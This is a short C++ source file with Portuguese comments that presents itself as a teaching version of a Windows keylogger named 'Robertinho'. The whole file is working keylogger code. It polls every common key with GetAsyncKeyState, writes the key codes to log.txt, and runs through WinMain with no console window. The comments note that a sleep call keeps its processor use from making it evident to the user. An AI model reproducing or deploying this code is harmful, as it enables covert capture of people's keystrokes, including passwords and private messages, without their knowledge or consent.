/*
	
	Robertinho funciona de maneira muito simples:

	Ele possui um loop que constatemente verifica o estado das teclas no teclado,
	caso ele verifique alguma tecla pressionada, então a escreve em um log.

	Esse programa é apenas para entendimento. O Robertinho original é ligeiramente 
	diferente em pró de uma melhor performance;

*/


// A bibliotecas essenciais para o funcionamento são:

#include <Windows.h>	/*	Essa biblioteca serve para a interação com o sistema windows,
							ela oferece os recursos essenciais como a verificação do estado das teclas */

#include <iostream>		//	iostream é nescessaria pois a proxima biblioteca é dependente desta

#include <fstream>		/*	Essa outra biblioteca serve para interagir com arquivos externos, podendo
							criar, modificar, ou excluir esses arquivos */

std::ofstream file;		//	Este objeto vai representar o arquivo externo

void write(int key);		/*	A Operação para gravar as teclas vai ser posta em uma função a parte
							mas isso é preferencial e poderia muito bem estar na main

							O argumento "key" é um inteiro pois cada tecla do teclado é representada
							por um numero inteiro 

							*Obs.: Quando ao declarar uma função se coloca ; significa que vc terá que
							definir suas propriedades mais tarde
						*/




/*
	A função main agora sera substituida pela função WinMain

	WinMain é uma função usada para criar janelas no Windows, porem nenhuma
	janela será criada.

	Ela inicializa o programa sem iniciar o console
*/
int CALLBACK WinMain(			
	HINSTANCE	hInstance,
	HINSTANCE	hPrevInstance,
	LPSTR		lpCmdLine,
	int			nCmdShow
)
{

	while (true) // loop infinito
	{
		for (int key = 8; key < 190; key++) // loop que passa pelo codigo de cada tecla comum do teclado
			if(GetAsyncKeyState(key))		// caso a tecla esteja pressionada, a função write key é chamada
				write(key);					// recebendo como argumento o codigo da tecla pressionada

		Sleep(1000 / 6);	/*	Sleep é uma função que serve para pausar o programa
								sem essa função, o programa usaria o maximo do processador
								e ficaria evidente ao usuario

								Alem disso ela evita que teclas sejam repetidas constantemente a cada
								volta que o loop der e perceber que a tecla continua pressionada
							*/
	}

}

void write(int key)		//	A definição do que a função "write" já declarada anteriormente irá fazer
{
	file.open("log.txt", std::fstream::app);	/*	a função open abre um arquivo que caso não exista sera gerado
													ela recebe 2 argumentos. O primeiro é o nome do arquivo, e o segundo
													é a forma de tratar este arquvio.
												*/

	file << key;	// Com isso as teclas serão gravadas no arquivo sem nenhum polimento

	file.close();	// O arquivo deve ser fechado sempre que for aberto
}
